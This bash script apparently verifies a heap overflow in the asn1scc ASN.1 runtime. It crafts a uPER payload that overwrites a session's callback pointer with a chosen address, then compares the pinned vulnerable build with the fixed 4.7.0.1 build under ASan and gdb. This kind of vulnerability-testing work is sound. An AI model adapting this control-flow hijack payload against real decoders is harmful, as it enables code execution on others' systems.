#!/usr/bin/env bash
# Pointer-bearing consumer probe: generated SIZE(0..17) Payload embedded in a
# heap Session with a callback pointer at offset 24.  Wire bytes 20..27 carry
# a benign marker address; the pinned vulnerable runtime stores them into the
# live function pointer.  Fixed 4.7.0.1 must leave the safe handler intact.
# Expects `bash run.sh run` first (pinned runtimes + compiler under ./run).
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$HERE/run
cd "$HERE" || exit 2
export ASAN_OPTIONS=detect_leaks=0

mkdir -p "$OUT/gen-v17"
printf 'TEST DEFINITIONS ::= BEGIN\nPayload ::= OCTET STRING (SIZE(0..17))\nEND\n' \
  > "$OUT/gen-v17/schema.asn"
(cd "$OUT/gen-v17" && ../build/asn1scc/asn1scc -c -uPER schema.asn) \
  > "$OUT/codegen-pointer.log" 2>&1 || exit 2

INC="-I$OUT/gen-v17 -I$OUT/build/v46/asn1crt"
FIX="-I$OUT/gen-v17 -I$OUT/build/v47/asn1crt"
SRC="$HERE/pointer-target.c $OUT/gen-v17/schema.c"
gcc -g -O0 -Wall -no-pie -fsanitize=address $INC $SRC \
  "$OUT/build/v46/asn1crt/"*.c -o "$OUT/pointer_target_v46" || exit 2
gcc -g -O0 -Wall -no-pie -fsanitize=address $FIX $SRC \
  "$OUT/build/v47/asn1crt/"*.c -o "$OUT/pointer_target_v47" || exit 2
gcc -g -O0 -Wall -no-pie $INC $SRC \
  "$OUT/build/v46/asn1crt/"*.c -o "$OUT/pointer_target_plain_v46" || exit 2

# Non-PIE build gives marker a stable address; the wire must carry that exact
# little-endian value.  Each binary has its own marker address.
marker_addr() {
  local addr typ name
  while read -r addr typ name; do
    if [ "$name" = "marker" ]; then printf '%s' "$addr"; return 0; fi
  done < <(nm -n "$1" 2>/dev/null)
  return 1
}
hostile_hex() {
  local value=$((0x$(marker_addr "$1"))) h="" i b
  for i in $(seq 1 20); do h+="5a"; done
  for i in 0 1 2 3 4 5 6 7; do
    printf -v b '%02x' "$(( (value >> (8 * i)) & 255 ))"
    h+="$b"
  done
  for i in 1 2 3; do h+="cc"; done
  printf '%s' "$h"
}

round() {
  local bin=$1 port=$2 tag=$3 hex rc
  hex=$(hostile_hex "$bin") || return 2
  echo "=== $tag marker=0x$(marker_addr "$bin") chosen=$hex ==="
  "$bin" server "$port" 31 "$hex" > "$OUT/pointer-target-${tag}.log" 2>&1 &
  local srv=$!
  sleep 0.3
  "$bin" client "$port" 31 "$hex" >> "$OUT/pointer-target-${tag}.log" 2>&1
  wait "$srv"
  rc=$?
  cat "$OUT/pointer-target-${tag}.log"
  echo "=== $tag rc=$rc ==="
}

echo "### gdb hardware watch on the live callback pointer during decode ###"
gdbhex=$(hostile_hex "$OUT/pointer_target_plain_v46")
gdb -q -batch -x "$HERE/watch-pointer.gdb" \
  --args "$OUT/pointer_target_plain_v46" server 39284 31 "$gdbhex" \
  > "$OUT/gdb-pointer.log" 2>&1 &
gdbpid=$!
sleep 1.5
"$OUT/pointer_target_plain_v46" client 39284 31 "$gdbhex" >> "$OUT/gdb-pointer.log" 2>&1
wait "$gdbpid"
cat "$OUT/gdb-pointer.log"
echo

round "$OUT/pointer_target_v46" 39281 vulnerable
round "$OUT/pointer_target_v47" 39282 fixed_control
